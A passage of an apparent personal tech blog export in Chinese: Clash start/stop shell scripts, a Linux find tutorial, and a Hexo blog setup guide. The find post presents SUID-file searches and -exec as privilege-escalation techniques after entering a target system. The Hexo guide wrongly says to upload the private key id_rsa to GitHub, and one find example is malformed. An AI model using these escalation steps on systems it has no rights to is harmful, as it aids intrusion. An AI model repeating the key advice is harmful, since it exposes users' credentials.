<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">设置clash目录</span></span><br><span class="line">CLASH_DIR="$&#123;HOME&#125;/.config/clash"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">保存PID文件</span></span><br><span class="line">echo $$ &gt; $&#123;CLASH_DIR&#125;/clash.pid</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 订阅链接下载地址</span></span><br><span class="line">CLASH_URL="你的订阅链接"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 对比新的文件和旧的文件有什么不同</span></span><br><span class="line">diff $&#123;CLASH_DIR&#125;/config.yaml &lt;(curl -s $&#123;CLASH_URL&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">如果两个文件一致，就直接开启clash，如果不一致就生成备份旧文件并下载替换新的文件</span></span><br><span class="line">if [ "$?" == 0 ]</span><br><span class="line">then</span><br><span class="line">    /usr/bin/clash</span><br><span class="line">else</span><br><span class="line">    TIME=`date +'+%Y-%m-%d %H:%M%S'`</span><br><span class="line">    /usr/bin/cp $&#123;CLASH_DIR&#125;/config.yaml "$&#123;CLASH_DIR&#125;/config.yaml.bak$&#123;TIME&#125;"</span><br><span class="line">    curl -L -o $&#123;CLASH_DIR&#125;/config.yaml $&#123;CLASH_URL&#125;</span><br><span class="line">    /usr/bin/clash</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><code>stop-clash.sh</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">CLASH_DIR=<span class="string">"<span class="variable">$&#123;HOME&#125;</span>/.config/clash"</span></span></span><br><span class="line">PID=`cat $&#123;CLASH_DIR&#125;/clash.pid`</span><br><span class="line"></span><br><span class="line">kill -9 $&#123;PID&#125;</span><br><span class="line"></span><br><span class="line">/usr/bin/rm $&#123;CLASH_DIR&#125;/clash.pid</span><br></pre></td></tr></table></figure>

<p>写好后，需要给两个sh文件执行权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x stop-clash.sh start-clash.sh</span><br></pre></td></tr></table></figure>

<p>使用<code>systemctl</code>管理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable clash</span><br><span class="line">systemctl start clash</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>systemd</tag>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>find命令</title>
    <url>/2020/04/27/find%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>基本格式</p>
<p><code>find where what</code></p>
<p>例如在当前目录中查找任意文件和目录<br><code>find ./ *</code></p>
<p>搜索当前目录 yml后缀的文件<br><code>find ./ -name &quot;*.yml&quot;</code></p>
<a id="more"></a>

<p>非常有用的几个参数</p>
<ul>
<li><code>-type</code> 指定类型</li>
<li><code>-name</code> 指定名字</li>
<li><code>-user</code> 指定文件归属于指定用户</li>
<li><code>-size</code> 指定文件大小</li>
<li><code>-perm</code> 指定权限位</li>
<li><code>-exec</code> 用于执行命令</li>
<li>时间戳(具体看下面)</li>
</ul>
<h2 id="type"><a href="#type" class="headerlink" title="-type"></a>-type</h2><ul>
<li><code>-type d</code> 只查找目录<ul>
<li><code>find / -type d</code> 查找根目录下的所有目录</li>
</ul>
</li>
<li><code>-type f</code> 只查找文件<ul>
<li><code>find / -type f</code> 查找根目录下的所有文件</li>
</ul>
</li>
</ul>
<h2 id="name"><a href="#name" class="headerlink" title="-name"></a>-name</h2><ul>
<li><code>-name</code> 指定搜索文件的姓名</li>
<li><code>--iname</code> <code>-iname</code> 参数与 <code>-name</code> 相同，但是区别在于 <code>-iname</code> 不区分大小写</li>
</ul>
<p><code>-name &quot;*.yml&quot;</code></p>
<p><code>-name &quot;*.sh&quot;</code></p>
<p>使用通配符查找文件时要使用双引号括起来。</p>
<h2 id="size"><a href="#size" class="headerlink" title="-size"></a>-size</h2><p>文件大小单元:</p>
<ul>
<li>b 块</li>
<li>c 字节</li>
<li>w 字</li>
<li>k 千</li>
<li>M 兆</li>
<li>G 吉</li>
</ul>
<p>搜索当前目录下大于10KB的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find .&#x2F; -type f -size +10k</span><br></pre></td></tr></table></figure>

<p>搜索当前目录下小于10MB的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find .&#x2F; -type f -size -10M</span><br></pre></td></tr></table></figure>

<p>搜索当前目录下大小为10KB的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find .&#x2F; -type f -size 10k</span><br></pre></td></tr></table></figure>

<h2 id="user"><a href="#user" class="headerlink" title="-user"></a>-user</h2><p>指定用户名去查找，这在进入目标系统后进行提权后经常的操作。</p>
<p>查找根目录下属于root用户的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -user root</span><br></pre></td></tr></table></figure>

<h2 id="perm"><a href="#perm" class="headerlink" title="-perm"></a>-perm</h2><p>查找指定权限位的文件,指定权限位可以使用八进制表示</p>
<blockquote>
<p>r=4,w=2,x=1</p>
</blockquote>
<p>就和修改权限位一样的操作</p>
<p>查找根目录下其他人可读的文件,不考虑所有者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type -perm -o&#x3D;r</span><br></pre></td></tr></table></figure>

<p>查找根目录下usid位权限 -u=s</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s</span><br></pre></td></tr></table></figure>

<p>查找根目录下所有人可读可写可执行的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm 777</span><br></pre></td></tr></table></figure>

<p>查找根目录下文件为所属者可读可写，所属组可读，其他人可读的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm 644</span><br></pre></td></tr></table></figure>


<h2 id="time"><a href="#time" class="headerlink" title="-time"></a>-time</h2><p>文件有三种时间戳格式</p>
<ul>
<li>访问时间，用户最后一次访问时间<ul>
<li>-atime 天</li>
<li>-amin 分钟</li>
</ul>
</li>
<li>修改时间，用户最后一次修改时间<ul>
<li>-mtime 天</li>
<li>-mmin 分钟</li>
</ul>
</li>
<li>变化时间，文件数据元（例如权限等）最后一次修改时间<ul>
<li>-ctime 天</li>
<li>-cmin 分钟</li>
</ul>
</li>
</ul>
<ul>
<li>1天内部 -1</li>
<li>1天之前 +1</li>
<li>刚好在一天前 1</li>
</ul>
<p>搜索七天内被访问过的所有文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -atime -7</span><br></pre></td></tr></table></figure>

<p>搜索七天前被访问过的所有文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -atime +7</span><br></pre></td></tr></table></figure>

<p>搜索<strong>刚好</strong>七天前被访问过的所有文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -atime 7</span><br></pre></td></tr></table></figure>

<p>分钟同理</p>
<h2 id="exec"><a href="#exec" class="headerlink" title="-exec"></a>-exec</h2><p>这个参数可以执行一个命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -exec whoami \;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，每查找到一个文件，命令就会执行一次。</p>
<p>就像这样<br><img src="https://images.atsud0.me/images/post/Screenshot_20200427_125010.jpg" alt="find-exec"></p>
<p>我当前的目录下有两个文件，所有whoami这条命令被执行了两次。</p>
<p>所以这条命令也能被用于提权（看情况</p>
<h2 id="最重要的用法"><a href="#最重要的用法" class="headerlink" title="最重要的用法"></a>最重要的用法</h2><p>搜索suid位的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Linux-find</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+git搭建博客</title>
    <url>/2020/04/14/hexo-git%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>十分水，没有什么营养的搭建博客记录</p>
<a id="more"></a>


<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>首先需要安装nodejs环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nodejs</span><br></pre></td></tr></table></figure>
<p>然后安装hexo(要保证nodejs版本在10.0以上，自行编译安装nodejs的话gcc+要6.3.0版本以上)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i hexo-cli -g</span><br></pre></td></tr></table></figure>
<p>安装好后，新建一个空白文件夹，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
<p>初始化，<strong>如果是clone他人博客的源码的话，就不用初始化了。</strong></p>
<p>初始化之后使用<code>npm install</code> 安装所需要的模块。</p>
<p><code>hexo g</code>生成静态页面，接着<code>hexo s</code>运行服务器，这时就可以检查有没有安装成功了</p>
<h2 id="部署到git"><a href="#部署到git" class="headerlink" title="部署到git"></a>部署到git</h2><p>生成密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">会让你输入两次密码，一路回车就好</span><br></pre></td></tr></table></figure>

<p>将生成的内容<code>id_rsa</code> 复制粘贴到github上的ssh中。<br>使用ssh -T <a href="mailto:git@github.com">git@github.com</a>测试</p>
<p>如果以下语句就说明成功了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hi username! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>接着在<code>_config.yml</code>下最后的内容添加部署格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type: &#39;git&#39;</span><br><span class="line">repo: &#39;git@github.com:&lt;username&gt;&#x2F;&lt;reponame&gt;.git&#39;</span><br><span class="line">branch: &#39;master&#39;</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000005125610" target="_blank" rel="noopener">详细教程</a></p>
<h2 id="clone他人博客源码之后该如何部署"><a href="#clone他人博客源码之后该如何部署" class="headerlink" title="clone他人博客源码之后该如何部署"></a>clone他人博客源码之后该如何部署</h2><p>首先确定安装好了<code>hexo</code>，接着clone你想要部署的博客的源码，在源码的目录下，<code>npm install</code>安装所需要的模块，在去<code>theme/主题名字</code>下再<code>npm install</code>一次，安装主题</p>
<p>接着就正常<code>hexo s</code>,<code>hexo g</code>了，最后修改<code>_config.yml</code>文件内容以及删去其他原博主的文章即可。</p>
<h2 id="nodejs版本过高"><a href="#nodejs版本过高" class="headerlink" title="nodejs版本过高"></a>nodejs版本过高</h2><p>最近nodejs已经更新到了14.2.0了,但是hexo还是没有更新到5.0.0,所以,如果你的nodejs版本过高,会无法<code>deploy</code>推送到github.</p>
<p>解决办法:降级nodejs</p>
<p>但是nodejs的依赖包过多,怕会影响其他软件,所以应该要使用<a href="https://aur.archlinux.org/packages/nvm/" target="_blank" rel="noopener">nvm</a>,nodejs的版本管理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nvm #安装nvm</span><br><span class="line">echo &#39;source &#x2F;usr&#x2F;share&#x2F;nvm&#x2F;init-nvm.sh&#39; &gt;&gt; ~&#x2F;.zshrc #如果你使用的是bash,就改为.bashrc</span><br><span class="line">source ~&#x2F;.zshrc</span><br><span class="line">nvm install 12.0</span><br><span class="line">nvm use 12.0</span><br></pre></td></tr></table></figure>




<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/35668237" target="_blank" rel="noopener">超详细Hexo+Github博客搭建小白教程</a></p>
<h2 id="后续主题配置"><a href="#后续主题配置" class="headerlink" title="后续主题配置"></a>后续主题配置</h2><p>我使用的主题是<a href="https://github.com/theme-next" target="_blank" rel="noopener">next</a><br>因为用的人很多，已经有许多现成的配置教程了。<br><a href="https://theme-next.iissnan.com/" target="_blank" rel="noopener">Next使用文档</a></p>
<h3 id="next添加访客人数和总访问量"><a href="#next添加访客人数和总访问量" class="headerlink" title="next添加访客人数和总访问量"></a>next添加访客人数和总访问量</h3><p>修改主题配置<code>/theme/next/_config.yml</code>文件,找到以下内容:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">    <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">    <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br></pre></td></tr></table></figure>

<p>将<code>enable:false</code>修改为<code>enable:true</code></p>
<ul>
<li>site_uv表示是否显示整个网站的访客数</li>
<li>site_pv表示是否显示整个网站的访问数</li>
<li>page_pv表示是否显示每个页面的阅读数</li>
</ul>
<h3 id="页面点击添加爱心"><a href="#页面点击添加爱心" class="headerlink" title="页面点击添加爱心"></a>页面点击添加爱心</h3><p>转自:<a href="https://asdfv1929.github.io/2018/01/26/click-love/" target="_blank" rel="noopener">asdfv1929</a></p>
<h4 id="创建js文件"><a href="#创建js文件" class="headerlink" title="创建js文件"></a>创建js文件</h4><p>在<code>/themes/next/source/js/src</code>下新建文件<code>clicklove.js</code>，接着把该链接下的代码拷贝粘贴到<code>clicklove.js</code>文件中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">"left:"</span>+d[e].x+<span class="string">"px;top:"</span>+d[e].y+<span class="string">"px;opacity:"</span>+d[e].alpha+<span class="string">";transform:scale("</span>+d[e].scale+<span class="string">","</span>+d[e].scale+<span class="string">") rotate(45deg);background:"</span>+d[e].color+<span class="string">";z-index:99999"</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">"function"</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">"div"</span>);a.className=<span class="string">"heart"</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX<span class="number">-5</span>,<span class="attr">y</span>:e.clientY<span class="number">-5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">"style"</span>);a.type=<span class="string">"text/css"</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">"rgb("</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">","</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">")"</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;setTimeout(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>

<h4 id="修改-layout-swig"><a href="#修改-layout-swig" class="headerlink" title="修改_layout.swig"></a>修改_layout.swig</h4><p>在<code>\themes\next\layout\_layout.swig</code>文件末尾添加：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"/js/src/clicklove.js"</span>&gt;&lt;<span class="regexp">/script</span></span><br></pre></td></tr></table></figure>

<h3 id="侧边栏添加音乐播放器"><a href="#侧边栏添加音乐播放器" class="headerlink" title="侧边栏添加音乐播放器"></a>侧边栏添加音乐播放器</h3><p>参考链接:</p>
<ul>
<li><a href="https://blog.yleao.com/2018/0902/hexo%E4%B8%8A%E7%9A%84aplayer%E5%BA%94%E7%94%A8.html" title="" target="">hexo上的aplayer应用</a></li>
<li><a href="https://enfangzhong.github.io/2019/12/08/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0APlayer%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8%E5%8A%9F%E8%83%BD/" title="" target="">Hexo个人博客添加APlayer音乐播放器功能</a>

</li>
</ul>
<p>先克隆<code>aplayer</code>项目到本地,然后将<code>dist</code>目录复制到<code>themes/next/source/dist</code>下.新建一个文件名为<code>music.js</code>代码如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ap = <span class="keyword">new</span> APlayer(&#123;</span><br><span class="line">        container: <span class="built_in">document</span>.getElementById(<span class="string">'aplayer'</span>),</span><br><span class="line">        fixed: <span class="literal">false</span>, <span class="comment">//吸底模式</span></span><br><span class="line">        autoplay: <span class="literal">false</span>, <span class="comment">//自动播放</span></span><br><span class="line">    audio: [</span><br><span class="line">        &#123;</span><br><span class="line">            name: <span class="string">"小さな恋のうた"</span>,<span class="comment">//音频名称</span></span><br><span class="line">            artist: <span class="string">'新垣結衣'</span>,<span class="comment">//音频艺术家</span></span><br><span class="line">            url: <span class="string">'音乐外链'</span>,<span class="comment">//音频外链</span></span><br><span class="line">            cover: <span class="string">'http://p1.music.126.net/jn5QCsmkR3WIDEOBvYqnpg==/892803441798468.jpg?param=130y130'</span><span class="comment">//音频封面</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>关于样式更多信息可以去看<a href="https://aplayer.js.org/#/zh-Hans/?id=%E5%85%A5%E9%97%A8" target="_blank" rel="noopener">aplayer的官方文档</a>.</p>
<p>在主题的侧边栏中添加播放器</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/dist/APlayer.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"aplayer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/dist/APlayer.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/dist/music.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我是将其放在了<code>themes/next/layout/_macro/sidebar.swig</code>中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"toggle sidebar-toggle"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"toggle-line toggle-line-first"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"toggle-line toggle-line-middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"toggle-line toggle-line-last"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">"sidebar"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sidebar-inner"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    &#123;%- set display_toc = page.toc.enable and display_toc %&#125;</span><br><span class="line">    &#123;%- if display_toc %&#125;</span><br><span class="line">      &#123;%- set toc = toc(page.content, &#123; class: "nav", list_number: page.toc.number, max_depth: page.toc.max_depth &#125;) %&#125;</span><br><span class="line">      &#123;%- set display_toc = toc.length &gt; 1 and display_toc %&#125;</span><br><span class="line">    &#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"sidebar-nav motion-element"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"sidebar-nav-toc"</span>&gt;</span></span><br><span class="line">        &#123;&#123; __('sidebar.toc') &#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"sidebar-nav-overview"</span>&gt;</span></span><br><span class="line">        &#123;&#123; __('sidebar.overview') &#125;&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--noindex--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post-toc-wrap sidebar-panel"</span>&gt;</span></span><br><span class="line">      &#123;%- if display_toc %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"post-toc motion-element"</span>&gt;</span>&#123;&#123; toc &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      &#123;%- endif %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--/noindex--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"site-overview-wrap sidebar-panel"</span>&gt;</span></span><br><span class="line">      &#123;&#123; partial('_partials/sidebar/site-overview.swig', &#123;&#125;, &#123;cache: theme.cache.enable&#125;) &#125;&#125;</span><br><span class="line">      <span class="comment">&lt;!-- 加入APlayer音乐播放器 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/dist/APlayer.min.css"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"aplayer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/dist/APlayer.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/dist/music.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      &#123;&#123;- next_inject('sidebar') &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;%- if theme.back2top.enable and theme.back2top.sidebar %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"back-to-top motion-element"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fa fa-arrow-up"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>0%<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;%- endif %&#125;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"sidebar-dimmer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h4 id="文章添加音乐播放器"><a href="#文章添加音乐播放器" class="headerlink" title="文章添加音乐播放器"></a>文章添加音乐播放器</h4><p>需要安装<code>hexo-tag-aplayer</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure>

<p>在文章中添加以下代码,即可生成音乐播放器(和侧边栏播放器冲突,两者存在的时候会优先选择文章音乐播放器)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %&#125;</span><br></pre></td></tr></table></figure>

<p>关于<code>hexo-tag-aplayer</code>更多使用方式请前往官方项目地址:<a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md" target="_blank" rel="noopener">github</a></p>
<h3 id="next主题添加字数统计"><a href="#next主题添加字数统计" class="headerlink" title="next主题添加字数统计"></a>next主题添加字数统计</h3><p>安装这个插件<code>hexo-symbols-count-time</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<p>接着,在博客的配置文件中<code>_config.yml</code>添加以下代码.</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">    <span class="attr">symbols:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">time:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">total_symbols:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">total_time:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>在主题的配置文件<code>themes/next/_config.yml</code>中找到以下代码</p>
